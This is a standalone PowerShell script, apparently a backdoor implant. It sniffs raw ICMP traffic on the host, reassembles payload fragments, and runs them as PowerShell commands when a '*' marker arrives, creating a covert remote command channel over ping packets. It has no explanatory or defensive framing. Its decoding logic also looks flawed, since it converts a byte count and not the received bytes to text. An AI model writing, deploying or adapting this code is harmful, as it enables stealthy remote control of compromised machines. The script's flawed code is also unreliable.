﻿$Host.UI.RawUI.BackgroundColor = 'Black';cls

$IP = (Get-NetIPAddress | Where-Object {$_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00"}).IPAddress

$ICMPSocket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
$Address = New-Object system.net.IPEndPoint([system.net.IPAddress]::Parse($IP), 0) 
$ICMPSocket.bind($Address)
$ICMPSocket.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::GetBytes(1), 0)
$buffer = new-object byte[] $ICMPSocket.ReceiveBufferSize
$String = [System.Collections.ArrayList]@()

cls
while($True){   
$EncodedBuf = $ICMPSocket.Receive($buffer)-28;$DecodedBuf = [System.Text.Encoding]::ASCII.GetString($EncodedBuf);

if($DecodedBuf -eq "*"){$fullstr=$String -join '';powershell -command "$fullstr";$String = [System.Collections.ArrayList]@();$DecodedBuf= ''}

if($DecodedBuf -eq "-"){$fullstr=$String -join '';write-host $fullstr;$String = [System.Collections.ArrayList]@();$DecodedBuf= ''}


$String.Add($DecodedBuf) | out-null


}

exit
